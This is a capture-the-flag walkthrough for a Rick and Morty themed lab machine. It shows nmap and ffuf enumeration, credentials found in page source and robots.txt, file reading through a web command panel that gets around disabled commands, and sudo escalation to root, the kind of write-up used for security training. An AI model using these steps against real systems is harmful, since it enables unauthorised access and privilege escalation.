# Pickle Ricky
![tryhackme_logo](https://user-images.githubusercontent.com/83867734/185771149-cb02c6f2-8476-4ab3-a626-cca8db0a08bf.png)

Difficulty: **Easy**

This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.

Tags
--
* brute forcing 
* hash cracking 
* service enumeration
* Linux Enumeration

Tools used
--
* nmap
* ffuf

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Athena OS
* IP Address: 10.18.98.39

Victim:
* Name: victim_machine
* IP Address: 10.10.191.18
* Other information must be gathered during the attack

Phase 1: Enumeration
--
```
sudo nmap -sS -sC -sV 10.10.191.18 -p- -vvv

<SNIP>
Initiating SYN Stealth Scan at 23:18
Scanning 10.10.191.18 [65535 ports]
Discovered open port 80/tcp on 10.10.191.18
Discovered open port 22/tcp on 10.10.191.18
<SNIP>
```
Visit `http://10.10.191.18` and check for useful information. On the page source of the home page, you can see the following comment:
```
  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```
Check hidden resources by FFUF:
```
ffuf -u http://10.10.191.18/FFUF -H 'Host: 10.10.191.18' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/2
0100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' -H 'Sec-GPC: 1' -w /usr/share/payloads/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FFUF

assets                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 39ms]
```
Useless resource. Check for .txt files:
```
ffuf -u http://10.10.191.18/FFUF.txt -H 'Host: 10.10.191.18' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/2
0100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' -H 'Sec-GPC: 1' -w /usr/share/payloads/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FFUF

robots                  [Status: 200, Size: 17, Words: 1, Lines: 2, Duration: 40ms]
```
`robots.txt` contains the following string:
```
Wubbalubbadubdub
```
it could be a password. Let's search for HTML files:
```
ffuf -u http://10.10.191.18/FFUF.html -H 'Host: 10.10.191.18' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/2
0100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' -H 'Sec-GPC: 1' -w /usr/share/payloads/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FFUF

index                   [Status: 200, Size: 615, Words: 2, Lines: 3, Duration: 2851ms]
```
Let's search for PHP files:
```
ffuf -u http://10.10.191.18/FFUF.php -H 'Host: 10.10.191.18' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/2
0100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' -H 'Sec-GPC: 1' -w /usr/share/payloads/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FFUF

login                   [Status: 200, Size: 455, Words: 2, Lines: 2, Duration: 52ms]
portal                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
```
Go on `http://10.10.191.18/login.php` and authenticate by `R1ckRul3s:Wubbalubbadubdub` credentials and we get access to the Portal page where there is a Command Panel. From here, `cat`, `most` and `head` commands are disabled, but you can read files by `less` command.

On the Command Panel, run `less Sup3rS3cretPickl3Ingred.txt` for getting the first ingredient. The second ingredient can be retrieved by `less "/home/rick/second ingredients"`. For getting the third ingredient, we need to have root privileges. Try to run `sudo`, we note that the `www-data` user can be run as sudo. So run `sudo less /root/3rd.txt` and you will get the third ingredient.